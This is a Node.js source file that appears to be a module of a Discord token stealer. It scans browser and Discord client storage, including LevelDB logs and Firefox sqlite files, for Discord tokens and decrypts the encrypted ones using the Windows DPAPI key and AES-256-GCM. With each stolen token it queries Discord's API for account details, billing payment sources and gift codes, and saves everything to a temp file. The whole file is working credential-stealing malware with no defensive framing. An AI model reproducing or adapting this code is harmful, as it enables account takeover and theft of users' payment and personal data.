const { join } = require('path');
const { browsers } = require('../util/variables');
const { execSync } = require('child_process');
const { readFileSync, existsSync, readdirSync, writeFileSync, statSync } = require('fs');
const { getTempFolder } = require('../util/init');
const fs = require('fs');
const { Dpapi } = require('@primno/dpapi');
const crypto = require('crypto');
const { REST } = require('@discordjs/rest');
const { Routes } = require('discord-api-types/v10');

const jsonFile = join(getTempFolder(), 'Discord.json');
writeFileSync(jsonFile, '{}');
const tokens = [];
const tokenRegex = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}/gi;
const encryptedTokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;

const decryptKey = (localState) => {
  const encryptedKey = JSON.parse(fs.readFileSync(localState, 'utf8')).os_crypt.encrypted_key;
  const encrypted = Buffer.from(encryptedKey, 'base64').slice(5);
  return Dpapi.unprotectData(Buffer.from(encrypted, 'utf8'), null, 'CurrentUser');
};

const decryptRickRoll = (path) => {
  return new Promise((resolve) => {
    const encryptedTokens = [];
    const localStatePath = join(path, 'Local State');
    if (!existsSync(localStatePath)) return;

    const key = decryptKey(localStatePath);
    const levelDB = path.includes('cord') ? join(path, 'Local Storage', 'leveldb') : join(path, 'Default', 'Local Storage', 'leveldb');
    if (!existsSync(levelDB)) return;

    readdirSync(levelDB).map(async f => {
      if (f.split('.').pop() !== 'log' && f.split('.').pop() !== 'ldb') return;
      const lines = readFileSync(join(levelDB, f), 'utf8').split('\n').map(x => x.trim());
      lines.forEach(line => {
        line.match(tokenRegex)?.forEach(token => {
          if (!tokens.find(t => t.token === token)) tokens.push({
            token,
            source: path.replace(process.env.LOCALAPPDATA, '').replace(process.env.APPDATA, '').replace('User Data', '').split('\\').join(' ').trim()
          });
        });
        line.match(encryptedTokenRegex)?.forEach(token => {
          if (token.endsWith('\\')) token = (token.slice(0, -1).replace('\\', '')).slice(0, -1);
          if (!encryptedTokens.includes(token)) encryptedTokens.push(token);
        });
      });
      for (let token of encryptedTokens) {
        let decrypted;
        const encryptedValue = Buffer.from(token.split(':')[1], 'base64');
        const start = encryptedValue.slice(3, 15);
        const middle = encryptedValue.slice(15, encryptedValue.length - 16);
        const end = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
        decipher.setAuthTag(end);
        decrypted = decipher.update(middle, 'base64', 'utf8') + decipher.final('utf8');

        if (
          typeof decrypted === 'string' && decrypted.match(tokenRegex) && !tokens.find(t => t.token === decrypted)
        ) tokens.push({
          token: decrypted,
          source: path.replace(process.env.LOCALAPPDATA, '').replace(process.env.APPDATA, '').replace('User Data', '').split('\\').join(' ').trim()
        });
      }
      resolve();
    });
  });
};

const handleTokens = async (tokens, resolve) => {
  const userInfo = async (rest, token, source) => {
    const data = await rest.get(Routes.user('@me'));
    data.token = token;
    data.source = source;
    let info = JSON.parse(readFileSync(jsonFile, 'utf8'));
    if (!info.accounts) info.accounts = [];
    if (!info.accounts.find(account => account.id === data.id)) {
      info.accounts.push(data);
      writeFileSync(jsonFile, JSON.stringify(info));
    } else if (info.accounts.find(account => account.id === data.id && !account.source.includes(source))) {
      info.accounts.find(account => account.id === data.id).source += ', ' + source;
      writeFileSync(jsonFile, JSON.stringify(info));
    }
  };
  const paymentSources = async (rest) => {
    const data = await rest.get(Routes.user('@me').concat('/billing/payment-sources'));
    let info = JSON.parse(readFileSync(jsonFile, 'utf8'));
    if (!info.billing) info.billing = [];
    data.forEach(billing => {
      if (!info.billing.find(b => b.id === billing.id)) info.billing.push(billing);
    });
    writeFileSync(jsonFile, JSON.stringify(info));
  };
  const gifts = async (rest) => {
    const data = await rest.get(Routes.user('@me').concat('/outbound-promotions/codes'));
    let info = JSON.parse(readFileSync(jsonFile, 'utf8'));
    if (!info.gifts) info.gifts = [];
    data.forEach(gift => {
      if (!info.gifts.find(g => g.id === gift.id)) info.gifts.push(gift);
    });
    writeFileSync(jsonFile, JSON.stringify(info));
  };
  for (const { token, source } of tokens) {
    const rest = new REST({ version: '10', authPrefix: '' }).setToken(token);
    await userInfo(rest, token, source);
    await paymentSources(rest);
    await gifts(rest);
  }
  resolve();
};

module.exports = new Promise((resolve) => {
  const tokensList = [];
  for (const path of Object.keys(browsers)) {
    if (!existsSync(browsers[path])) continue;
    if (path.includes('Firefox')) {
      const search = execSync('where /r . *.sqlite', { cwd: browsers[path] }).toString();
      search?.split(/\r?\n/).forEach((filePath) => {
        filePath = filePath.trim();
        if (!existsSync(filePath) || !statSync(filePath).isFile()) return;
        const lines = readFileSync(filePath, 'utf8').split('\n').map(x => x.trim());
        lines?.forEach((line) => {
          line.match(tokenRegex)?.forEach((token) => {
            if (
              // Each number is the first number a Discord User ID contains, depending on which Discord API
              // version they account was created
              !token.startsWith('MTg') && // 1
              !token.startsWith('MjI') && // 2
              !token.startsWith('MzM') && // 3
              !token.startsWith('NDU') && // 4
              !token.startsWith('NTE') && // 5
              !token.startsWith('NjU') && // 6
              !token.startsWith('NzM') && // 7
              !token.startsWith('ODA') && // 8
              !token.startsWith('OTk') && // 9
              !token.startsWith('MTA') && // 10
              !token.startsWith('MTE')    // 11
            ) return;
            if (!tokens.find(t => t.token === token)) tokens.push({ token, source: 'Mozilla Firefox' });
          });
        });
      });
      tokensList.push(...tokens);
    } else {
      decryptRickRoll(browsers[path]).then(() => tokensList.push(...tokens));
    }
    handleTokens(tokens, resolve);
  }
});
